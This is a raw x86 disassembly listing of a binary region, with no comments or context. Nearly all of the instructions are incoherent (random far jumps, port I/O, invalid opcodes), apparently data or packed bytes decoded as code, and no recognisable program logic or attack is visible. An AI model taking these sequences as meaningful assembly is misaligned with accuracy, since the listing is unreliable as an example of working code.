  4057b2:	mov    BYTE PTR [eax+0x75],0x7b
  4057b6:	addps  xmm7,XMMWORD PTR [esi+0x5093d21a]
  4057bd:	lods   al,BYTE PTR ds:[esi]
  4057be:	ret    
  4057bf:	call   0xbd6ae8b1
  4057c4:	fcomp  QWORD PTR [ebx]
  4057c7:	aaa    
  4057c8:	adc    BYTE PTR [ebp+0x7a3cdfd0],dl
  4057ce:	pop    ebp
  4057cf:	dec    ebp
  4057d0:	inc    ebp
  4057d1:	loope  0x4057c8
  4057d3:	mov    edi,0x9c13ece4
  4057d8:	or     esp,ecx
  4057da:	adc    ch,BYTE PTR [edx-0x30]
  4057dd:	ds mov dl,0x66
  4057e0:	shl    DWORD PTR [ebx],0xfb
  4057e3:	ins    DWORD PTR es:[edi],dx
  4057e4:	into   
  4057e5:	std    
  4057e6:	add    bh,BYTE PTR [edi]
  4057e8:	adc    BYTE PTR [esi-0x53899daf],bl
  4057ee:	push   edi
  4057ef:	call   0xef29:0x129bf84f
  4057f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057f7:	jg     0x405871
  4057f9:	pop    esp
  4057fa:	stos   DWORD PTR es:[edi],eax
  4057fb:	adc    eax,0xd3f14bd2
  405800:	mov    dh,0x5
  405802:	addr16 dec si
  405805:	cld    
  405806:	sbb    al,0x8d
  405808:	or     eax,0x8d1e61d5
  40580d:	lock and bl,BYTE PTR ss:[ecx+0x21]
  405812:	inc    eax
  405813:	xor    al,BYTE PTR [ebx+0x40]
  405816:	pushf  
  405817:	xor    esi,DWORD PTR [edx-0x55]
  40581a:	dec    edi
  40581b:	and    eax,eax
  40581d:	(bad)  
  40581e:	cwde   
  40581f:	out    0x7c,eax
  405821:	inc    ecx
  405822:	add    eax,0x6004b4b4
  405827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405828:	int    0xe2
  40582a:	fisub  WORD PTR [ebp-0x78]
  40582d:	mov    esp,0x7626bfb0
  405832:	mov    ecx,0x14c369af
  405837:	mov    ah,0xa
  405839:	xor    eax,0x2d649726
  40583e:	xchg   ebx,eax
  40583f:	pop    edx
  405840:	pop    ebp
  405841:	out    0xea,eax
  405843:	les    esi,FWORD PTR [esi]
  405845:	xlat   BYTE PTR ds:[ebx]
  405846:	pop    ds
  405847:	bnd jp 0x40589c
  40584a:	mov    bh,0xb9
  40584c:	xor    BYTE PTR [eax+0x68],dh
  40584f:	and    ebp,DWORD PTR [esp+ecx*2-0xfe180f4]
  405856:	in     eax,0xc9
  405858:	ja     0x4057e5
  40585a:	inc    ebx
  40585b:	ds xchg esi,eax
  40585d:	cmp    al,0x15
  40585f:	xor    BYTE PTR [eax],ah
  405861:	mov    cl,0x1f
  405863:	je     0x40586f
  405865:	jge    0x405892
  405867:	mov    DWORD PTR [esi-0x335031ae],edi
  40586d:	add    eax,0xeb7728b2
  405872:	xor    eax,0xf759386a
  405877:	stc    
  405878:	mov    ebx,cs
  40587a:	das    
  40587b:	sub    al,0x4c
  40587d:	imul   esp,DWORD PTR [edi-0x49],0xffffffec
  405881:	jg     0x405843
  405883:	cli    
  405884:	push   esi
  405885:	fcomp  QWORD PTR [edi-0x2e5e4323]
  40588b:	aas    
  40588c:	mov    esp,0x7f189ec6
  405891:	iret   
  405892:	ds pop ebp
  405894:	xor    DWORD PTR [ebp-0x37],edx
  405897:	js     0x4058ef
  405899:	and    edx,DWORD PTR [edx-0x39f95915]
  40589f:	pusha  
  4058a0:	push   ebx
  4058a1:	aaa    
  4058a2:	and    BYTE PTR [eax],0xcc
  4058a5:	jbe    0x405854
  4058a7:	stc    
  4058a8:	adc    al,0xbe
  4058aa:	lods   al,BYTE PTR ds:[esi]
  4058ab:	dec    ebx
  4058ac:	retf   0x9994
  4058af:	mov    ecx,fs
  4058b1:	mov    cl,0xaf
  4058b3:	lea    esi,[edi+esi*1-0x74e0795f]
  4058ba:	cmp    BYTE PTR [edi+0x2e],al
  4058bd:	fwait
  4058be:	cli    
  4058bf:	xchg   edi,eax
  4058c0:	leave  
  4058c1:	sub    al,0xf
  4058c3:	or     eax,0x76460999
  4058c8:	inc    ecx
  4058c9:	hlt    
  4058ca:	repz mul BYTE PTR [ebp-0x7736b23c]
  4058d1:	push   edx
  4058d2:	mov    edx,0xad01efbe
  4058d7:	xor    BYTE PTR [edi-0x4305d16b],dl
  4058dd:	jbe    0x40588a
  4058df:	xchg   ebx,eax
  4058e0:	cmp    al,0x5d
  4058e2:	outs   dx,DWORD PTR ds:[esi]
  4058e3:	lods   al,BYTE PTR ds:[esi]
  4058e4:	mov    esp,0xea47caaa
  4058e9:	test   BYTE PTR [edi+0x40cdca5b],dl
  4058ef:	push   ebx
  4058f0:	sub    DWORD PTR [ecx+ebx*8+0x36],ebp
  4058f4:	xchg   edx,eax
  4058f5:	or     ebp,eax
  4058f7:	mov    dh,0xfc
  4058f9:	add    al,0x3c
  4058fb:	imul   edi,DWORD PTR [ebp-0x6e],0xb693ed24
  405902:	lahf   
  405903:	xchg   ecx,eax
  405904:	inc    ebx
  405905:	push   es
  405906:	retf   
  405907:	sar    BYTE PTR [ebx-0x35],0x72
  40590b:	ss nop
  40590d:	and    al,0xf0
  40590f:	dec    ebx
  405910:	mov    ebp,0x6e5a390a
  405915:	aas    
  405916:	xor    bl,BYTE PTR [esi]
  405918:	sub    DWORD PTR [edi+0x3b],ebx
  40591b:	mov    bl,0xc
  40591d:	ds scas al,BYTE PTR es:[edi]
  40591f:	bound  ecx,QWORD PTR [edi+0x411fc789]
  405925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405926:	pop    ss
  405927:	push   ebx
  405928:	dec    esp
  405929:	push   esi
  40592a:	test   ebp,eax
  40592c:	mov    BYTE PTR [eax],dl
  40592e:	jmp    0x53b5:0x994c09e0
  405935:	out    0x4,al
  405937:	cmp    bh,bl
  405939:	cld    
  40593a:	or     ah,BYTE PTR [edi+ecx*1]
  40593d:	sbb    eax,0xf4461c12
  405942:	push   edi
  405943:	inc    ecx
  405944:	loop   0x405998
  405946:	loopne 0x4059c0
  405948:	sti    
  405949:	dec    ebp
  40594a:	push   edx
  40594b:	sbb    eax,0x5ff8416a
  405950:	jl     0x405941
  405952:	xor    DWORD PTR [edi],ecx
  405954:	and    edi,DWORD PTR [ebx+0x57]
  405957:	in     eax,dx
  405958:	mov    esp,0xde1642ee
  40595d:	or     DWORD PTR [edx],edi
  40595f:	push   ebp
  405960:	mov    ah,0xb5
  405962:	sbb    ah,BYTE PTR [ebp+0x71eba9f3]
  405968:	dec    esp
  405969:	dec    esi
  40596a:	int    0xd6
  40596c:	pop    ebp
  40596d:	ret    
  40596e:	ins    DWORD PTR es:[edi],dx
  40596f:	sbb    BYTE PTR [esi-0x4f],0xdf
  405973:	aas    
  405974:	push   cs
  405975:	mov    al,0x29
  405977:	pop    ecx
  405978:	xchg   esp,eax
  405979:	in     al,0xb5
  40597b:	rol    BYTE PTR [edi+edx*1+0xd],cl
  40597f:	add    DWORD PTR [edi+0x24b95f51],esp
  405985:	(bad)  
  405986:	sub    BYTE PTR [edi-0x235510f8],0x1
  40598d:	push   edx
  40598e:	sbb    BYTE PTR [esi*2-0xaf85e8e],ch
  405995:	and    al,0x54
  405997:	jno    0x40598f
  405999:	out    0x3b,eax
  40599b:	pop    edx
  40599c:	jne    0x405a05
  40599e:	add    DWORD PTR [esi+0x3c],ebp
  4059a1:	mov    eax,ds:0x4d3e7495
  4059a6:	in     al,0x34
  4059a8:	(bad)  
  4059a9:	test   eax,0x443405c6
  4059ae:	dec    ebp
  4059af:	or     DWORD PTR ds:0x850abe94,ebx
  4059b5:	and    ebp,DWORD PTR [ebx+edi*8-0x36]
  4059b9:	xor    BYTE PTR [eax],ch
  4059bb:	pop    edi
  4059bc:	pusha  
  4059bd:	repz sbb eax,0x72c16c06
  4059c3:	inc    esi
  4059c4:	xchg   esp,eax
  4059c5:	xchg   DWORD PTR [edx],ebx
  4059c7:	xlat   BYTE PTR ds:[ebx]
  4059c8:	icebp  
  4059c9:	cmc    
  4059ca:	shr    bh,cl
  4059cc:	ret    0x95a
  4059cf:	imul   BYTE PTR [edi-0x71203403]
  4059d5:	mov    bl,0xb5
  4059d7:	repz fdivp st(1),st
  4059da:	jnp    0x405a17
  4059dc:	jbe    0x405a40
  4059de:	dec    esi
  4059df:	mov    ebp,0x73163912
  4059e4:	push   edi
  4059e5:	aam    0xec
  4059e7:	bswap  esi
  4059e9:	outs   dx,DWORD PTR ds:[esi]
  4059ea:	loop   0x405a07
  4059ec:	loopne 0x405a20
  4059ee:	(bad)  
  4059ef:	cli    
  4059f0:	aad    0x3
  4059f2:	jne    0x405a04
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a3a
  405a20:	mov    edx,0x38671724
  405a25:	js     0x405a9f
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x405a5a
  405a2c:	xchg   ebp,eax
  405a2d:	sar    DWORD PTR [esp+ebp*1+0x50],cl
  405a31:	aas    
  405a32:	mov    BYTE PTR [ecx-0x77],al
  405a35:	test   DWORD PTR [ebx-0x76],ebp
  405a38:	mov    edi,0x7b781436
  405a3d:	mov    al,ds:0x2dcf89c3
  405a42:	xchg   esp,eax
  405a43:	push   ebx
  405a44:	enter  0xd17f,0x26
  405a48:	xchg   ebx,eax
  405a49:	icebp  
  405a4a:	xchg   ebp,eax
  405a4b:	and    DWORD PTR [ebx+eax*4+0x3b],ebx
  405a4f:	call   FWORD PTR [edi+0x4a673535]
  405a55:	fbstp  TBYTE PTR [ebp+ebp*8-0x1f113b81]
  405a5c:	mov    ebx,0xb59d356a
  405a61:	mov    cl,0xe8
  405a63:	ds push ss
  405a65:	shl    BYTE PTR [ebx-0x621e5d1e],cl
  405a6b:	jo     0x405a64
  405a6d:	iret   
  405a6e:	sti    
  405a6f:	or     ah,BYTE PTR [edx]
  405a71:	int    0xa3
  405a73:	(bad)  
  405a74:	lahf   
  405a75:	stos   BYTE PTR es:[edi],al
  405a76:	in     eax,0x2c
  405a78:	sti    
  405a79:	pusha  
  405a7a:	and    ch,cl
  405a7c:	cmp    BYTE PTR [ebx],ah
  405a7e:	test   DWORD PTR [esi+0x74d09476],0xc1e57c88
  405a88:	dec    edi
  405a89:	ds push ecx
  405a8b:	adc    dh,ch
  405a8d:	mov    ds:0x76ff5ef,eax
  405a92:	jp     0x405a64
  405a94:	or     dh,BYTE PTR [ebp+0x4fbc5a8]
  405a9a:	push   ebx
  405a9b:	or     ebp,eax
  405a9d:	mov    ebp,0x41aea54a
  405aa2:	bound  eax,QWORD PTR [ecx-0x3a169da2]
  405aa8:	icebp  
  405aa9:	pop    ebp
  405aaa:	aaa    
  405aab:	adc    ax,0x4882
  405aaf:	mov    WORD PTR [edx+0x2241d00],ss
  405ab5:	in     eax,dx
  405ab6:	add    ecx,DWORD PTR [ebx-0x9b01bd0]
  405abc:	jg     0x405a54
  405abe:	ficomp WORD PTR [esi-0x1a672152]
  405ac4:	(bad)  
  405ac5:	and    ebp,edi
  405ac7:	sti    
  405ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ac9:	mov    edx,0x406fd4cb
  405ace:	ins    DWORD PTR es:[edi],dx
  405acf:	sub    al,0xe8
  405ad1:	push   eax
  405ad2:	push   edi
  405ad3:	pushf  
  405ad4:	cdq    
  405ad5:	xchg   esi,eax
  405ad6:	add    ebx,DWORD PTR [edi+0x7]
  405ad9:	sbb    eax,0x7815d67b
  405ade:	push   esi
  405adf:	lods   al,BYTE PTR ds:[esi]
  405ae0:	imul   ebp,eax,0x45914c1e
  405ae6:	sete   BYTE PTR [esi+ebp*1+0xe0563fb]
  405aee:	jge    0x405ad4
  405af0:	out    dx,eax
  405af1:	or     BYTE PTR ds:0x922ddc36,al
  405af7:	ret    0x542e
  405afa:	xor    eax,0x2b7ce1b
  405aff:	fs adc eax,0xef6c2ae6
  405b05:	aam    0x3e
  405b07:	mov    al,0x7f
  405b09:	in     eax,dx
  405b0a:	mov    esp,0xb7036cc6
  405b0f:	pop    esi
  405b10:	xchg   ebp,eax
  405b11:	push   0xbc2081d
  405b16:	rcr    DWORD PTR [esi-0x19e7105a],1
  405b1c:	in     eax,dx
  405b1d:	adc    al,0x99
  405b1f:	push   ebp
  405b20:	jbe    0x405b9b
  405b22:	push   esi
  405b23:	jge    0x405b3d
  405b25:	sbb    BYTE PTR [ecx+0x6b],cl
  405b28:	jae    0x405b14
  405b2a:	daa    
  405b2b:	push   eax
  405b2c:	int    0x49
  405b2e:	push   edx
  405b2f:	out    0x15,al
  405b31:	mov    cl,0xf1
  405b33:	lock push 0x4f
  405b36:	imul   esi,DWORD PTR [ebx],0x7d
  405b39:	call   0xec26117
  405b3e:	popa   
  405b3f:	sub    esp,esi
  405b41:	cld    
  405b42:	cld    
  405b43:	push   edx
  405b44:	or     esi,DWORD PTR [ecx]
  405b46:	adc    DWORD PTR [ecx],ebx
  405b48:	and    BYTE PTR [ecx+esi*8-0x4fbca014],0x36
  405b50:	pop    esp
  405b51:	inc    edx
  405b52:	fwait
  405b53:	call   0x7e4c:0xedc8d71c
  405b5a:	test   eax,0x9901692a
  405b5f:	xchg   esi,eax
  405b60:	jg     0x405b77
  405b62:	adc    BYTE PTR [ebx+0x23],al
  405b65:	jp     0x405b59
  405b67:	out    0x8f,al
  405b69:	and    DWORD PTR [edi+0x3d],edi
  405b6c:	inc    ebp
  405b6d:	clc    
  405b6e:	xor    bl,0x98
  405b71:	push   eax
  405b72:	cmc    
  405b73:	dec    ebx
  405b74:	mov    DWORD PTR ds:0x6306d2,0x5b1eb71a
  405b7e:	mov    esp,0x4aee65ad
  405b83:	or     eax,0xdd0e5502
  405b88:	mov    dl,0xa6
  405b8a:	pop    edi
  405b8b:	xchg   si,ax
  405b8d:	ins    DWORD PTR es:[edi],dx
  405b8e:	clc    
  405b8f:	loope  0x405bf1
  405b91:	mov    eax,0xafc96c88
  405b96:	push   esp
  405b97:	push   ds
  405b98:	mov    ebp,0x6f715065
  405b9d:	ins    DWORD PTR es:[edi],dx
  405b9e:	jmp    0xdc48:0xf63f34f7
  405ba5:	jg     0x405b7e
  405ba7:	xchg   edx,eax
  405ba8:	dec    ebp
  405ba9:	cmp    DWORD PTR [ebp-0x17],edx
  405bac:	inc    edi
  405bad:	xchg   ah,al
  405baf:	sbb    al,0x61
  405bb1:	push   ss
  405bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb3:	xchg   ebp,eax
  405bb4:	jl     0x405bf8
  405bb6:	push   edx
  405bb7:	stc    
  405bb8:	test   al,0x18
  405bba:	mov    bl,BYTE PTR [edi-0x66ae3a3d]
  405bc0:	lods   eax,DWORD PTR ds:[esi]
  405bc1:	jmp    0x4e55840f
  405bc6:	and    BYTE PTR [eax+0x4aef23b9],al
  405bcc:	xchg   ebx,eax
  405bcd:	pop    es
  405bce:	mov    cl,0x25
  405bd0:	lock bound edi,QWORD PTR [edi]
  405bd3:	stos   DWORD PTR es:[edi],eax
  405bd4:	idiv   BYTE PTR [ebp-0x9074f00]
  405bda:	dec    eax
  405bdb:	in     al,dx
  405bdc:	mov    ?,WORD PTR ds:0x73571a82
  405be2:	leave  
  405be3:	fist   WORD PTR [ebp+0x4b]
  405be6:	mov    al,ds:0xece70b37
  405beb:	add    al,0xeb
  405bed:	fidiv  DWORD PTR [ebx+0x1c9603bc]
  405bf3:	xor    al,0xd5
  405bf5:	hlt    
  405bf6:	cld    
  405bf7:	add    ch,ah
  405bf9:	sub    al,0x3d
  405bfb:	mov    eax,ds:0xa1a1fada
  405c00:	fs std 
  405c02:	daa    
  405c03:	push   es
  405c04:	push   ebx
  405c05:	mov    ah,0xb7
  405c07:	and    eax,0xd6869a66
  405c0c:	jmp    0x8153:0xe65f2cc8
  405c13:	ficom  DWORD PTR [esi-0x547a2ac1]
  405c19:	mov    eax,0x4fc83cd5
  405c1e:	cmovns ebp,DWORD PTR [ecx+eiz*1-0x5fd53426]
  405c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c27:	xlat   BYTE PTR ds:[ebx]
  405c28:	adc    al,0xcf
  405c2a:	imul   edi,esi,0xffffff83
  405c2d:	jecxz  0x405bf4
  405c2f:	sub    ch,cl
  405c31:	loopne 0x405bf1
  405c33:	push   0x17
  405c35:	fild   WORD PTR [ebx-0x7b]
  405c38:	or     al,0xdf
  405c3a:	clc    
  405c3b:	xor    edx,DWORD PTR [edi+ebx*8]
  405c3e:	adc    al,BYTE PTR [ebx+eax*4-0x92c9d43]
  405c45:	dec    ecx
  405c46:	mov    ch,0x56
  405c48:	mov    esp,0xdb3b3725
  405c4d:	outs   dx,DWORD PTR ds:[esi]
  405c4e:	inc    edx
  405c4f:	call   0xe3291b11
  405c54:	int3   
  405c55:	pop    ecx
  405c56:	pop    edx
  405c57:	xchg   ebx,eax
  405c58:	loop   0x405c1c
  405c5a:	iret   
  405c5b:	lahf   
  405c5c:	fwait
  405c5d:	repnz (bad) 
  405c5f:	shr    BYTE PTR [ecx],cl
  405c61:	call   0x4ede:0x9372dba7
  405c68:	cdq    
  405c69:	test   al,0x15
  405c6b:	cmp    al,0xec
  405c6d:	push   esi
  405c6e:	pop    edx
  405c6f:	fadd   QWORD PTR [ebx+0x6e]
  405c72:	or     esp,ebx
  405c74:	xor    bh,BYTE PTR [esi+eiz*4]
  405c77:	mov    dl,BYTE PTR [ebx-0x41a5520]
  405c7d:	stc    
  405c7e:	or     edx,esp
  405c80:	push   es
  405c81:	jno    0x405ce4
  405c83:	imul   edx,DWORD PTR [ecx+0x7d],0x38e9dc91
  405c8a:	aaa    
  405c8b:	cdq    
  405c8c:	inc    ecx
  405c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c8e:	mov    cl,0x46
  405c90:	test   BYTE PTR [esi+0x68],cl
  405c93:	in     eax,0x55
  405c95:	jnp    0x405c3a
  405c97:	and    BYTE PTR [ebp+0x63341a40],cl
  405c9d:	popf   
  405c9e:	ja     0x405c99
  405ca0:	fwait
  405ca1:	mov    al,ds:0xd11babba
  405ca6:	pop    edi
  405ca7:	add    BYTE PTR [eax+0x6cbd5fc8],ch
  405cad:	ret    0x72c6
  405cb0:	mov    dh,0x6b
  405cb2:	shl    BYTE PTR [edi+0x62],0x22
  405cb6:	pop    ss
  405cb7:	daa    
  405cb8:	mov    eax,ebp
  405cba:	adc    esi,edi
  405cbc:	jle    0x405ce2
  405cbe:	pop    esp
  405cbf:	outs   dx,BYTE PTR ds:[esi]
  405cc0:	push   bx
  405cc2:	shr    BYTE PTR [ecx+eax*4],cl
  405cc5:	scas   al,BYTE PTR es:[edi]
  405cc6:	retf   
  405cc7:	in     al,0xf3
  405cc9:	popa   
  405cca:	push   es
  405ccb:	add    ebx,DWORD PTR [edx]
  405ccd:	hlt    
  405cce:	pop    esi
  405ccf:	sub    edi,DWORD PTR [esi+0x61]
  405cd2:	push   esi
  405cd3:	push   esp
  405cd4:	mov    bl,0x29
  405cd6:	and    cl,BYTE PTR [ebx]
  405cd8:	cmp    eax,0x13bac40f
  405cdd:	popa   
  405cde:	(bad)  
  405cdf:	nop
  405ce0:	adc    eax,0x276c02ba
  405ce5:	mov    ch,0xfa
  405ce7:	fcomp  DWORD PTR [esp+edi*2]
  405cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ceb:	mov    ch,0x32
  405ced:	jbe    0x405cdf
  405cef:	mov    bl,0xbf
  405cf1:	xchg   edi,eax
  405cf2:	and    DWORD PTR [eax-0x50cf28ac],0x77
  405cf9:	fmulp  st(6),st
  405cfb:	das    
  405cfc:	call   edx
  405cfe:	xor    edx,edx
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0x35024c09
  405d13:	mov    ebx,0x783db417
  405d18:	js     0x405d67
  405d1a:	jle    0x405d94
  405d1c:	js     0x405cd3
  405d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d1f:	pop    edi
  405d20:	retf   0x22f5
  405d23:	inc    ebp
  405d24:	xchg   edx,eax
  405d25:	push   eax
  405d26:	cmc    
  405d27:	mov    WORD PTR [edi-0x24a26d50],cs
  405d2d:	jae    0x405cd4
  405d2f:	std    
  405d30:	add    cl,BYTE PTR [ebx]
  405d32:	sub    eax,0x4423b0b1
  405d37:	mov    edx,0xd9447295
  405d3c:	mov    esp,0x27c40406
  405d41:	xor    bh,0xc8
  405d44:	retf   
  405d45:	cmp    esp,0x783900e3
  405d4b:	shr    DWORD PTR [esi-0x58],1
  405d4e:	mov    eax,ds:0x60fd3c13
  405d53:	shl    BYTE PTR [edx-0x6ebb0019],1
  405d59:	xchg   edx,eax
  405d5a:	jno    0x405d63
  405d5c:	xchg   edi,eax
  405d5d:	not    BYTE PTR [edx+0x3767b057]
  405d63:	dec    edi
  405d64:	dec    eax
  405d65:	and    DWORD PTR [ecx-0xe],esi
  405d68:	jge    0x405dd2
  405d6a:	add    DWORD PTR [edx-0x5f],ecx
  405d6d:	jmp    0xccba243d
  405d72:	xchg   edx,eax
  405d73:	hlt    
  405d74:	cli    
  405d75:	jp     0x405d6b
  405d77:	test   al,0xc4
  405d79:	fs cdq 
  405d7b:	inc    edi
  405d7c:	sti    
  405d7d:	out    dx,eax
  405d7e:	or     BYTE PTR [esi],ah
  405d80:	mov    ss,WORD PTR [edi-0x1d]
  405d83:	push   ss
  405d84:	int    0x8
  405d86:	call   0xb695bfe6
  405d8b:	cmp    bl,bl
  405d8d:	jbe    0x405da1
  405d8f:	add    dh,dh
  405d91:	pop    ds
  405d92:	cmp    eax,0x2410b94
  405d97:	jns    0x405df5
  405d99:	rol    BYTE PTR [eax-0x3271b3b],1
  405d9f:	arpl   si,ax
  405da1:	dec    ebp
  405da2:	sbb    BYTE PTR [eax+ebp*4+0x15c27141],dh
  405da9:	fldcw  WORD PTR [eax-0x4]
  405dac:	ds test al,0xa6
  405daf:	(bad)  
  405db0:	call   0x8e0ea080
  405db5:	mov    al,0x13
  405db7:	push   0x60c73f6a
  405dbc:	ins    DWORD PTR es:[edi],dx
  405dbd:	jmp    0x8d5a:0xda5fd439
  405dc4:	les    ebx,FWORD PTR ds:0x829ba26d
  405dca:	loop   0x405e3c
  405dcc:	jp     0x405def
  405dce:	adc    DWORD PTR [edx-0x23],edi
  405dd1:	pop    esi
  405dd2:	add    DWORD PTR [ebp-0x25],esi
  405dd5:	jo     0x405da4
  405dd7:	mov    ecx,0xc6e547f0
  405ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ddd:	in     al,0x72
  405ddf:	aas    
  405de0:	sti    
  405de1:	das    
  405de2:	mov    edx,0x779cb3ad
  405de7:	inc    al
  405de9:	repz call 0x69a3:0x52695508
  405df1:	mov    dl,0xdb
  405df3:	mov    ebp,0x565e652d
  405df8:	out    0x8a,eax
  405dfa:	mov    dl,0x5b
  405dfc:	jge    0x405dd7
  405dfe:	xchg   esi,eax
  405dff:	popa   
  405e00:	bound  ebx,QWORD PTR [ecx+0x75]
  405e03:	pop    edx
  405e04:	inc    esp
  405e05:	jbe    0x405e0f
  405e07:	lods   al,BYTE PTR ds:[esi]
  405e08:	push   edx
  405e09:	adc    ebx,ebp
  405e0b:	sbb    DWORD PTR [ecx+eiz*2-0x5afbf7b6],ecx
  405e12:	cmp    DWORD PTR [edi],eax
  405e14:	ja     0x405dda
  405e16:	pusha  
  405e17:	cwde   
  405e18:	mov    edx,0x179cdce9
  405e1d:	mov    bh,0x2d
  405e1f:	cdq    
  405e20:	push   edx
  405e21:	lea    ebx,[edi+0x38]
  405e24:	fistp  QWORD PTR [ecx-0x31]
  405e27:	retf   
  405e28:	repnz sbb BYTE PTR [eax*1+0x29a8ee98],0x6b
  405e31:	ins    BYTE PTR es:[edi],dx
  405e32:	sub    BYTE PTR [esi-0x2613d6e5],ah
  405e38:	mov    al,ds:0x1c1fcb7c
  405e3d:	dec    eax
  405e3e:	sbb    eax,0xa85d8ab5
  405e43:	push   esp
  405e44:	and    DWORD PTR [esi+esi*4+0x6f567018],0x6f
  405e4c:	pop    es
  405e4d:	jmp    0x405e22
  405e4f:	imul   edi,DWORD PTR [ebp+0x16],0x28
  405e53:	in     eax,dx
  405e54:	pusha  
  405e55:	ret    
  405e56:	ret    0x5134
  405e59:	ss je  0x405e98
  405e5c:	rcr    bl,cl
  405e5e:	ins    BYTE PTR es:[edi],dx
  405e5f:	add    eax,0x4a6d52a8
  405e64:	sbb    BYTE PTR [eax+0x63cd1318],bl
  405e6a:	or     ebp,DWORD PTR [ecx-0xe]
  405e6d:	lahf   
  405e6e:	int3   
  405e6f:	pop    ebx
  405e70:	mov    ch,0x44
  405e72:	scas   al,BYTE PTR es:[edi]
  405e73:	aaa    
  405e74:	xor    BYTE PTR [edi-0x21f07e0b],ah
  405e7a:	int3   
  405e7b:	aam    0x72
  405e7d:	mov    ds:0x8011f18d,al
  405e82:	(bad)  
  405e83:	adc    edx,esi
  405e85:	sbb    eax,0xbd56546e
  405e8a:	mov    ah,0xb0
  405e8c:	cmp    al,0x6c
  405e8e:	or     eax,esp
  405e90:	popa   
  405e91:	jmp    0x5fac:0xfcc802c
  405e98:	bnd jns 0x405ee3
  405e9b:	mov    eax,ds:0x94d39696
  405ea0:	push   0xffffffa9
  405ea2:	xchg   edx,eax
  405ea3:	jne    0x405ee1
  405ea5:	jmp    0xc824:0x944aebec
  405eac:	cmp    DWORD PTR [eax-0x351797dd],ebx
  405eb2:	mov    bl,0x25
  405eb4:	lods   eax,DWORD PTR ds:[esi]
  405eb5:	std    
  405eb6:	sbb    al,0x56
  405eb8:	push   esp
  405eb9:	mov    eax,eax
  405ebb:	cmc    
  405ebc:	(bad)  
  405ebe:	ficomp DWORD PTR [edx+0x3a]
  405ec1:	inc    edi
  405ec2:	jno    0x405ec9
  405ec4:	gs cmp ch,cl
  405ec7:	bound  edx,QWORD PTR [eax+esi*1-0x7a57ee3f]
  405ece:	test   DWORD PTR ds:0xda03c5d2,edi
  405ed4:	(bad)  
  405ed5:	ss jbe 0x405f20
  405ed8:	test   al,0x89
  405eda:	ins    DWORD PTR es:[edi],dx
  405edb:	mov    eax,ds:0x68f998e7
  405ee0:	dec    esp
  405ee1:	fucomip st,st(1)
  405ee3:	lahf   
  405ee4:	scas   eax,DWORD PTR es:[edi]
  405ee5:	nop
  405ee6:	mov    al,0x44
  405ee8:	imul   ebp,DWORD PTR ds:0x971b361f,0x23
  405eef:	pop    edx
  405ef0:	jnp    0x405f1d
  405ef2:	push   es
  405ef3:	test   eax,0xaaeee1b0
  405ef8:	ffree  st(2)
  405efa:	mov    ebx,0xb32cc3a
  405eff:	(bad)  
  405f00:	jg     0x405ef3
  405f02:	pop    es
  405f03:	add    BYTE PTR [edi],dl
  405f05:	push   edx
  405f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f07:	pop    es
  405f08:	mov    ecx,0xbb6726df
  405f0d:	shl    DWORD PTR [edi],1
  405f0f:	(bad)  
  405f10:	pushf  
  405f11:	dec    esi
  405f12:	mov    ch,0xb3
  405f14:	pop    esp
  405f15:	jmp    0x4c023761
  405f1a:	gs aaa 
  405f1c:	inc    esi
  405f1d:	bound  ebp,QWORD PTR [edi-0x6c8f246c]
  405f23:	retf   
  405f24:	lahf   
  405f25:	push   ecx
  405f26:	imul   ebx,DWORD PTR [ecx-0x516553bf],0x51
  405f2d:	outs   dx,BYTE PTR ds:[esi]
  405f2e:	sub    al,0x14
  405f30:	lock inc esp
  405f32:	and    esp,ebx
  405f34:	dec    esi
  405f35:	xor    DWORD PTR [ebx-0x693f8f02],ecx
  405f3b:	or     al,0x7c
  405f3d:	mov    ch,0xb3
  405f3f:	dec    esi
  405f40:	sub    DWORD PTR [eax],edi
  405f42:	adc    eax,0x69bb4bd2
  405f47:	inc    ebx
  405f48:	ins    DWORD PTR es:[edi],dx
  405f49:	jg     0x405eef
  405f4b:	loope  0x405f1b
  405f4d:	sbb    BYTE PTR [eax],cl
  405f4f:	ins    BYTE PTR es:[edi],dx
  405f50:	stos   BYTE PTR es:[edi],al
  405f51:	mov    WORD PTR [eax-0xb],es
  405f54:	inc    ebp
  405f55:	push   ebp
  405f56:	stc    
  405f57:	mov    al,0xdd
  405f59:	test   eax,0x7ec5acad
  405f5e:	ins    DWORD PTR es:[edi],dx
  405f5f:	dec    ebp
  405f60:	push   esp
  405f61:	cmc    
  405f62:	in     al,dx
  405f63:	cmp    DWORD PTR [eax],eax
  405f65:	ret    0xb64b
  405f68:	out    0xf6,eax
  405f6a:	das    
  405f6b:	push   ss
  405f6c:	cmc    
  405f6d:	pop    esi
  405f6e:	mov    ebp,0x8e0b1b43
  405f73:	xchg   esp,eax
  405f74:	or     ecx,DWORD PTR [ebx-0x60]
  405f77:	jl     0x405fad
  405f79:	or     BYTE PTR [edx],0xd3
  405f7c:	xchg   edx,eax
  405f7d:	mov    ecx,0x69846eea
  405f82:	add    ebp,DWORD PTR [esi]
  405f84:	push   es
  405f85:	mov    al,ds:0xef6de218
  405f8a:	cwde   
